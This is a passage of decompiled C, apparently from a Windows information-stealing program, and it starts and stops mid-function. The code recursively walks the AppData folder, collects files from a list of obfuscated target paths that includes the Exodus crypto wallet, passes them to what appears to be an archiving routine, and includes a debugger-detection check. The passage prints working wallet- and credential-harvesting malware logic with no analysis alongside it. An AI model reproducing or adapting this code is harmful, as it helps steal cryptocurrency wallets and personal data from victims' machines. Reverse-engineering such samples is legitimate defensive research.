  local_648 = (int **)&stack0xfffff960;
  local_8._0_1_ = 4;
  FUN_00398680();
  FUN_003a5b90(&local_658,in_stack_fffff960);
  local_8 = CONCAT31(local_8._1_3_,6);
  uVar7 = extraout_EDX;
  if (0xf < local_5b8) {
    FUN_003aee4b(local_5cc[0]);
    uVar7 = extraout_EDX_00;
  }
  uVar9 = CONCAT44(uVar7,_DAT_003d9814);
  local_5b8 = 0xf;
  local_5bc = 0;
  local_5cc[0] = (void *)((uint)local_5cc[0] & 0xffffff00);
  local_648 = local_654;
  local_640 = local_658;
  if (local_658 != local_654) {
    do {
      local_59c = 7;
      local_5a0 = 0;
      local_5b0 = (void *)((uint)local_5b0 & 0xffff0000);
      FUN_00398300(local_640,(int *)0x0);
      local_8._0_1_ = 7;
      FUN_003a5840();
      local_8._0_1_ = 8;
      puVar5 = FUN_00395cd0(local_63c,local_55c,&param_3);
      local_8 = CONCAT31(local_8._1_3_,9);
      _Src = (void **)FUN_00389b80(puVar5,(undefined *)local_620);
      pvVar2 = local_578[0];
      local_564 = (void *)0xf;
      local_568 = (void *)0x0;
      local_578[0] = (void *)((uint)local_578[0] & 0xffffff00);
      if (local_578 != _Src) {
        local_564 = (void *)0xf;
        local_568 = (void *)0x0;
        local_578[0] = (void *)((uint)pvVar2 & 0xffffff00);
        if (_Src[5] < (void *)0x10) {
          FID_conflict__memcpy(local_578,_Src,(int)_Src[4] + 1);
        }
        else {
          local_578[0] = *_Src;
          *_Src = (void *)0x0;
        }
        local_568 = _Src[4];
        local_564 = _Src[5];
        _Src[4] = (void *)0x0;
        _Src[5] = (void *)0x0;
      }
      if (0xf < local_60c) {
        FUN_003aee4b(local_620[0]);
      }
      local_60c = 0xf;
      local_610 = 0;
      local_620[0] = (void *)((uint)local_620[0] & 0xffffff00);
      if (0xf < local_628) {
        FUN_003aee4b(local_63c[0]);
      }
      local_628 = 0xf;
      local_62c = 0;
      local_63c[0] = (void *)((uint)local_63c[0] & 0xffffff00);
      local_8._0_1_ = 0xe;
      if (0xf < local_5f0) {
        FUN_003aee4b(local_604);
      }
      local_5f0 = 0xf;
      local_5f4 = 0;
      local_604 = (void *)((uint)local_604 & 0xffffff00);
      FUN_003a5840();
      local_8._0_1_ = 0xf;
      puVar5 = FUN_00395cd0(local_540,local_55c,&param_3);
      local_8._0_1_ = 0x10;
      FUN_00389b80(puVar5,(undefined *)local_524);
      local_8 = CONCAT31(local_8._1_3_,0x11);
      FUN_003a58e0();
      uVar6 = (*_DAT_003d9364)();
      if ((uVar6 == 0xffffffff) || ((uVar6 & 0x10) != 0)) {
        bVar1 = false;
      }
      else {
        bVar1 = true;
      }
      if (7 < local_5d4) {
        FUN_003aee4b(local_5e8);
      }
      local_5d4 = 7;
      local_5d8 = 0;
      local_5e8 = (void *)((uint)local_5e8 & 0xffff0000);
      if (0xf < local_510) {
        FUN_003aee4b(local_524[0]);
      }
      local_510 = 0xf;
      local_514 = 0;
      local_524[0] = (void *)((uint)local_524[0] & 0xffffff00);
      if (0xf < local_52c) {
        FUN_003aee4b(local_540[0]);
      }
      local_8._0_1_ = 0xe;
      local_52c = 0xf;
      local_530 = 0;
      local_540[0] = (void *)((uint)local_540[0] & 0xffffff00);
      if (0xf < local_580) {
        FUN_003aee4b(local_594);
      }
      if (bVar1) {
        *(int *)(local_644 + 0x1c) = *(int *)(local_644 + 0x1c) + 1;
        _DAT_003d92f4 = _DAT_003d92f4 + *(int *)(local_644 + 0x1c);
        _DAT_003d92e0 = _DAT_003d92e0 + 1;
      }
      trim_string((undefined (*) [16])local_120,0,0x104);
      (*_DAT_003d9520)();
      (*_DAT_003d9520)();
      (*_DAT_003d9520)();
      (*_DAT_003d9520)(local_120,&DAT_003d0e3c);
      (*_DAT_003d9520)(local_120,&DAT_003d0e3c);
      (*_DAT_003d9520)(local_120,&DAT_003d0e40);
      (*_DAT_003d9520)(local_120,&DAT_003d0e44);
      (*_DAT_003d9520)(local_120,&DAT_003d0e48);
      (*_DAT_003d9520)(local_120,&DAT_003ce7fc);
      puVar5 = in_stack_00000028;
      if (in_stack_0000003c < 0x10) {
        puVar5 = (undefined4 *)&stack0x00000028;
      }
      (*_DAT_003d9520)(local_120,puVar5);
      (*_DAT_003d9520)(local_120,&DAT_003ce7fc);
      puVar5 = (undefined4 *)FUN_003a5840();
      local_8._0_1_ = 0x12;
      if (0xf < (uint)puVar5[5]) {
        puVar5 = (undefined4 *)*puVar5;
      }
      (*_DAT_003d9520)(local_120,puVar5);
      local_8._0_1_ = 0xe;
      if (0xf < local_580) {
        FUN_003aee4b(local_594);
      }
      FUN_003a5840();
      local_8._0_1_ = 0x13;
      puVar5 = FUN_00395cd0(local_524,local_55c,&param_3);
      local_8._0_1_ = 0x14;
      puVar5 = (undefined4 *)FUN_00389b80(puVar5,(undefined *)local_540);
      local_8 = CONCAT31(local_8._1_3_,0x15);
      if (0xf < (uint)puVar5[5]) {
        puVar5 = (undefined4 *)*puVar5;
      }
      iVar3 = (*_DAT_003d93b4)(puVar5,0x80000000,3,0,3,0x80,0);
      if (iVar3 != -1) {
        (*_DAT_003d936c)();
        (*_DAT_003d93b8)();
      }
      if (0xf < local_52c) {
        FUN_003aee4b(local_540[0]);
      }
      local_52c = 0xf;
      local_530 = 0;
      local_540[0] = (void *)((uint)local_540[0] & 0xffffff00);
      if (0xf < local_510) {
        FUN_003aee4b(local_524[0]);
      }
      local_8._0_1_ = 0xe;
      local_510 = 0xf;
      local_514 = 0;
      local_524[0] = (void *)((uint)local_524[0] & 0xffffff00);
      if (0xf < local_580) {
        FUN_003aee4b(local_594);
      }
      FUN_003a5840();
      local_8._0_1_ = 0x16;
      puVar5 = FUN_00395cd0(local_524,local_55c,&param_3);
      local_8._0_1_ = 0x17;
      puVar5 = (undefined4 *)FUN_00389b80(puVar5,(undefined *)local_540);
      local_8 = CONCAT31(local_8._1_3_,0x18);
      if (0xf < (uint)puVar5[5]) {
        puVar5 = (undefined4 *)*puVar5;
      }
      piVar4 = *(int **)(local_644 + 0x20);
      if (piVar4 == (int *)0x0) {
        uVar9 = CONCAT44(extraout_EDX_01,0x10000);
      }
      else {
        if (*piVar4 == 2) {
          uVar9 = FUN_003ad750((char **)piVar4[1],(int)puVar5,local_120,0,2);
        }
        else {
          uVar9 = CONCAT44(extraout_EDX_01,0x80000);
        }
      }
      _DAT_003d9814 = (undefined4)uVar9;
      if (0xf < local_52c) {
        FUN_003aee4b(local_540[0]);
        uVar9 = CONCAT44(extraout_EDX_02,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar9;
      local_52c = 0xf;
      local_530 = 0;
      local_540[0] = (void *)((uint)local_540[0] & 0xffffff00);
      if (0xf < local_510) {
        FUN_003aee4b(local_524[0]);
        uVar9 = CONCAT44(extraout_EDX_03,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar9;
      local_510 = 0xf;
      local_514 = 0;
      local_524[0] = (void *)((uint)local_524[0] & 0xffffff00);
      if (0xf < local_580) {
        FUN_003aee4b(local_594);
        uVar9 = CONCAT44(extraout_EDX_04,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar9;
      if ((void *)0xf < local_564) {
        FUN_003aee4b(local_578[0]);
        uVar9 = CONCAT44(extraout_EDX_05,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar9;
      local_8 = CONCAT31(local_8._1_3_,6);
      if (7 < local_59c) {
        FUN_003aee4b(local_5b0);
        uVar9 = CONCAT44(extraout_EDX_06,_DAT_003d9814);
      }
      _DAT_003d9814 = (undefined4)uVar9;
      local_640 = local_640 + 7;
    } while (local_640 != local_648);
  }
  _DAT_003d9814 = (undefined4)uVar9;
  uVar10 = SUB41(puVar11,0);
  ppiVar8 = local_658;
  if (local_658 != (int **)0x0) {
    for (; ppiVar8 != local_654; ppiVar8 = ppiVar8 + 7) {
      if ((int *)0x7 < ppiVar8[5]) {
        FUN_003aee4b(*ppiVar8);
      }
      uVar10 = SUB41(puVar11,0);
      ppiVar8[5] = (int *)0x7;
      ppiVar8[4] = (int *)0x0;
      *(undefined2 *)ppiVar8 = 0;
    }
    FUN_003aee4b(local_658);
    uVar9 = CONCAT44(extraout_EDX_07,_DAT_003d9814);
  }
  _DAT_003d9814 = (undefined4)uVar9;
  local_658 = (int **)0x0;
  local_654 = (int **)0x0;
  local_650 = 0;
  if (0xf < local_548) {
    FUN_003aee4b(local_55c[0]);
    uVar9 = CONCAT44(extraout_EDX_08,_DAT_003d9814);
  }
  _DAT_003d9814 = (undefined4)uVar9;
  local_548 = 0xf;
  local_54c = 0;
  local_55c[0] = (void *)((uint)local_55c[0] & 0xffffff00);
  if (0xf < in_stack_00000020) {
    FUN_003aee4b(param_3);
    uVar9 = CONCAT44(extraout_EDX_09,_DAT_003d9814);
  }
  _DAT_003d9814 = (undefined4)uVar9;
  in_stack_00000020 = 0xf;
  uStack0000001c = 0;
  param_3 = (void *)((uint)param_3 & 0xffffff00);
  if (0xf < in_stack_0000003c) {
    FUN_003aee4b(in_stack_00000028);
    uVar9 = CONCAT44(extraout_EDX_10,_DAT_003d9814);
  }
  _DAT_003d9814 = (undefined4)uVar9;
  in_stack_0000003c = 0xf;
  uStack00000038 = 0;
  in_stack_00000028 = (undefined4 *)((uint)in_stack_00000028 & 0xffffff00);
  if (0xf < in_stack_00000058) {
    FUN_003aee4b(in_stack_00000044);
    uVar9 = CONCAT44(extraout_EDX_11,_DAT_003d9814);
  }
  _DAT_003d9814 = (undefined4)uVar9;
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present
            (local_18 ^ (uint)&stack0xfffffffc,(int)((ulonglong)uVar9 >> 0x20),uVar10);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_00396990(void *this,undefined4 param_1)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 extraout_EDX;
  undefined4 uVar4;
  int *unaff_EBX;
  int unaff_ESI;
  undefined8 uVar5;
  undefined *puVar6;
  undefined uVar7;
  undefined local_958 [44];
  undefined local_92c [276];
  undefined local_818 [1000];
  undefined local_430 [264];
  undefined local_328 [264];
  undefined local_220 [264];
  undefined local_118 [268];
  uint local_c;
  undefined *puVar8;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  trim_string((undefined (*) [16])local_220,0,0x104);
  trim_string((undefined (*) [16])local_818,0,1000);
  iVar1 = (*_DAT_003d9500)(0,0x1a,0,0,local_818);
  (*_DAT_003d9520)(local_220,(uint)local_818 & (iVar1 < 0) - 1);
  if (unaff_ESI == 0) {
    (*_DAT_003d9374)(local_430,"%s\\%s\\%s",local_220,param_1,this);
  }
  else {
    (*_DAT_003d9374)(local_430,"%s\\%s\\*",local_220,param_1);
  }
  puVar8 = local_430;
  uVar5 = (*_DAT_003d95e0)(puVar8,local_958);
  uVar4 = (undefined4)((ulonglong)uVar5 >> 0x20);
  iVar1 = (int)uVar5;
  uVar7 = SUB41(puVar8,0);
  if (iVar1 != -1) {
    do {
      iVar2 = (*_DAT_003d9550)(local_92c,&DAT_003d0ab0);
      if ((iVar2 != 0) && (iVar2 = (*_DAT_003d9550)(local_92c,&DAT_003d0ab4), iVar2 != 0)) {
        if (unaff_ESI == 0) {
          (*_DAT_003d9374)(local_328,"%s\\%s\\%s",local_220,param_1,local_92c);
        }
        else {
          (*_DAT_003d9374)(local_328,"%s\\%s\\%s\\%s",local_220,param_1,local_92c,this);
        }
        uVar3 = (*_DAT_003d9470)(local_328);
        if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {
          trim_string((undefined (*) [16])local_118,0,0x104);
          (*_DAT_003d9520)(local_118,&DAT_003ce7fc);
          (*_DAT_003d9520)(local_118,&DAT_003d0e34);
          (*_DAT_003d9520)(local_118,&DAT_003d0e38);
          (*_DAT_003d9520)(local_118,&DAT_003d0e3c);
          (*_DAT_003d9520)(local_118,&DAT_003d0e3c);
          (*_DAT_003d9520)(local_118,&DAT_003d0e40);
          (*_DAT_003d9520)(local_118,&DAT_003d0e44);
          (*_DAT_003d9520)(local_118,&DAT_003d0e48);
          (*_DAT_003d9520)(local_118,&DAT_003ce7fc);
          (*_DAT_003d9520)(local_118);
          (*_DAT_003d9520)(local_118,&DAT_003ce7fc);
          if (unaff_ESI == 0) {
            puVar6 = local_92c;
          }
          else {
            (*_DAT_003d9520)(local_118,local_92c);
            (*_DAT_003d9520)(local_118,&DAT_003ce7fc);
            puVar6 = (undefined *)this;
          }
          (*_DAT_003d9520)(local_118,puVar6);
          if (unaff_EBX == (int *)0x0) {
            _DAT_003d9814 = 0x10000;
          }
          else {
            if (*unaff_EBX == 2) {
              _DAT_003d9814 = FUN_003ad750((char **)unaff_EBX[1],(int)local_328,local_118,0,2);
            }
            else {
              _DAT_003d9814 = 0x80000;
            }
          }
        }
      }
      iVar2 = (*_DAT_003d9438)(iVar1,local_958);
      uVar7 = SUB41(puVar8,0);
    } while (iVar2 != 0);
    (*_DAT_003d93a8)(iVar1);
    uVar4 = extraout_EDX;
  }
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,uVar4,uVar7);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00396ce0(undefined4 param_1,undefined4 param_2,undefined4 param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 uVar3;
  undefined8 uVar4;
  undefined uVar5;
  undefined4 uVar6;
  byte local_954 [44];
  undefined local_928 [276];
  undefined local_814 [1000];
  undefined local_42c [264];
  undefined local_324 [264];
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  trim_string((undefined (*) [16])local_814,0,1000);
  uVar6 = 0x1a;
  iVar1 = (*_DAT_003d9500)(0,0x1a,0,0,local_814);
  (*_DAT_003d9374)(local_324,"%s\\%s\\*",(iVar1 < 0) - 1 & (uint)local_814,param_1);
  uVar4 = (*_DAT_003d95e0)(local_324,local_954);
  uVar3 = (undefined4)((ulonglong)uVar4 >> 0x20);
  iVar1 = (int)uVar4;
  uVar5 = (undefined)uVar6;
  if (iVar1 != -1) {
    do {
      iVar2 = (*_DAT_003d9550)(local_928,&DAT_003d0ab0);
      if (iVar2 != 0) {
        iVar2 = (*_DAT_003d9550)(local_928,&DAT_003d0ab4);
        if (iVar2 != 0) {
          (*_DAT_003d9374)(local_21c,"%s\\%s",param_1,local_928);
          trim_string((undefined (*) [16])local_814,0,1000);
          iVar2 = (*_DAT_003d9500)(0,0x1a,0,0,local_814);
          (*_DAT_003d9374)(local_42c,"%s\\%s",(iVar2 < 0) - 1 & (uint)local_814,local_21c);
          trim_string((undefined (*) [16])local_114,0,0x104);
          (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
          (*_DAT_003d9520)(local_114,&DAT_003d0e34);
          (*_DAT_003d9520)(local_114,&DAT_003d0e38);
          (*_DAT_003d9520)(local_114,&DAT_003d0e3c);
          (*_DAT_003d9520)(local_114,&DAT_003d0e3c);
          (*_DAT_003d9520)(local_114,&DAT_003d0e40);
          (*_DAT_003d9520)(local_114,&DAT_003d0e44);
          (*_DAT_003d9520)(local_114,&DAT_003d0e48);
          (*_DAT_003d9520)(local_114,param_1);
          (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
          (*_DAT_003d9520)(local_114,local_928);
          if (param_4 == (int *)0x0) {
            _DAT_003d9814 = 0x10000;
          }
          else {
            if (*param_4 == 2) {
              _DAT_003d9814 = FUN_003ad750((char **)param_4[1],(int)local_42c,local_114,0,2);
            }
            else {
              _DAT_003d9814 = 0x80000;
            }
          }
          if ((local_954[0] & 0x10) != 0) {
            FUN_00396ce0(local_21c,param_2,param_3,param_4);
          }
        }
      }
      iVar2 = (*_DAT_003d9438)(iVar1,local_954);
      uVar5 = (undefined)uVar6;
    } while (iVar2 != 0);
    (*_DAT_003d93a8)(iVar1);
    uVar3 = extraout_EDX;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar3,uVar5);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00396fa0(int param_1)

{
  int **ppiVar1;
  int *piVar2;
  int **in_FS_OFFSET;
  undefined uVar3;
  undefined *puVar4;
  uint in_stack_fffffa48;
  void *pvVar5;
  undefined *local_59c;
  undefined *puStack1432;
  undefined *puStack1428;
  undefined4 uStack1424;
  undefined *local_58c;
  undefined local_53c [264];
  undefined local_434 [264];
  undefined local_32c [264];
  undefined local_224 [264];
  undefined local_11c [264];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c50a2;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  ppiVar1 = DAT_003d8d50;
  *(undefined4 *)(param_1 + 0x20) = DAT_003d92ec;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  piVar2 = (int *)_strlen((char *)ppiVar1);
  local_58c = (undefined *)0x397029;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8cfc;
  local_8 = 0;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8cfc);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8f38;
  local_8 = CONCAT31(local_8._1_3_,1);
  pvVar5 = (void *)(in_stack_fffffa48 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8f38);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  piVar2 = (int *)_strlen("*.*");
  local_58c = (undefined *)0x3970f7;
  FUN_003894c0(&stack0xfffffa80,(int **)&DAT_003d0e6c,piVar2);
  ppiVar1 = DAT_003d8e3c;
  local_8 = 2;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8e3c);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8f04;
  local_8 = CONCAT31(local_8._1_3_,3);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8f04);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  piVar2 = (int *)_strlen("*.*");
  local_58c = (undefined *)0x3971c9;
  FUN_003894c0(&stack0xfffffa80,(int **)&DAT_003d0e6c,piVar2);
  ppiVar1 = DAT_003d8ce8;
  local_8 = 4;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8ce8);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8cd0;
  local_8 = CONCAT31(local_8._1_3_,5);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8cd0);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d91b8;
  piVar2 = (int *)_strlen((char *)DAT_003d91b8);
  local_58c = (undefined *)0x3972a5;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8c38;
  local_8 = 6;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8c38);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d90a8;
  local_8 = CONCAT31(local_8._1_3_,7);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d90a8);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d8e14;
  piVar2 = (int *)_strlen((char *)DAT_003d8e14);
  local_58c = (undefined *)0x397381;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8c38;
  local_8 = 8;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8c38);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d90a8;
  local_8 = CONCAT31(local_8._1_3_,9);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d90a8);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  piVar2 = (int *)_strlen("*.*");
  local_58c = (undefined *)0x397453;
  FUN_003894c0(&stack0xfffffa80,(int **)&DAT_003d0e6c,piVar2);
  local_8 = 10;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen("Exodus\\exodus.wallet");
  FUN_003894c0(&local_59c,(int **)"Exodus\\exodus.wallet",piVar2);
  ppiVar1 = DAT_003d8c54;
  local_8 = CONCAT31(local_8._1_3_,0xb);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8c54);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d914c;
  piVar2 = (int *)_strlen((char *)DAT_003d914c);
  local_58c = (undefined *)0x397525;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9198;
  local_8 = 0xc;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9198);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9020;
  local_8 = CONCAT31(local_8._1_3_,0xd);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9020);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d9008;
  piVar2 = (int *)_strlen((char *)DAT_003d9008);
  local_58c = (undefined *)0x397601;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d923c;
  local_8 = 0xe;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d923c);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8d7c;
  local_8 = CONCAT31(local_8._1_3_,0xf);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8d7c);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d8c00;
  piVar2 = (int *)_strlen((char *)DAT_003d8c00);
  local_58c = (undefined *)0x3976dd;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8ef0;
  local_8 = 0x10;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8ef0);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9134;
  local_8 = CONCAT31(local_8._1_3_,0x11);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9134);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  piVar2 = (int *)_strlen("*.*");
  local_58c = (undefined *)0x3977af;
  FUN_003894c0(&stack0xfffffa80,(int **)&DAT_003d0e6c,piVar2);
  ppiVar1 = DAT_003d8b28;
  local_8 = 0x12;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8b28);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d91ec;
  local_8 = CONCAT31(local_8._1_3_,0x13);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d91ec);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  piVar2 = (int *)_strlen("*.*");
  local_58c = (undefined *)0x397881;
  FUN_003894c0(&stack0xfffffa80,(int **)&DAT_003d0e6c,piVar2);
  ppiVar1 = DAT_003d8db0;
  local_8 = 0x14;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8db0);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8bf4;
  local_8 = CONCAT31(local_8._1_3_,0x15);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8bf4);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d9180;
  piVar2 = (int *)_strlen((char *)DAT_003d9180);
  local_58c = (undefined *)0x39795d;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9248;
  local_8 = 0x16;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9248);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9238;
  local_8 = CONCAT31(local_8._1_3_,0x17);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9238);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d8ff0;
  piVar2 = (int *)_strlen((char *)DAT_003d8ff0);
  local_58c = (undefined *)0x397a39;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9248;
  local_8 = 0x18;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9248);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9238;
  local_8 = CONCAT31(local_8._1_3_,0x19);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9238);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d8c90;
  piVar2 = (int *)_strlen((char *)DAT_003d8c90);
  local_58c = (undefined *)0x397b15;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9248;
  local_8 = 0x1a;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9248);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d9238;
  local_8 = CONCAT31(local_8._1_3_,0x1b);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d9238);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  ppiVar1 = DAT_003d91c0;
  piVar2 = (int *)_strlen((char *)DAT_003d91c0);
  local_58c = (undefined *)0x397bf1;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8b70;
  local_8 = 0x1c;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8b70);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8c50;
  local_8 = CONCAT31(local_8._1_3_,0x1d);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8c50);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,1,pvVar5);
  ppiVar1 = DAT_003d8eac;
  piVar2 = (int *)_strlen((char *)DAT_003d8eac);
  local_58c = (undefined *)0x397cce;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8b70;
  local_8 = 0x1e;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
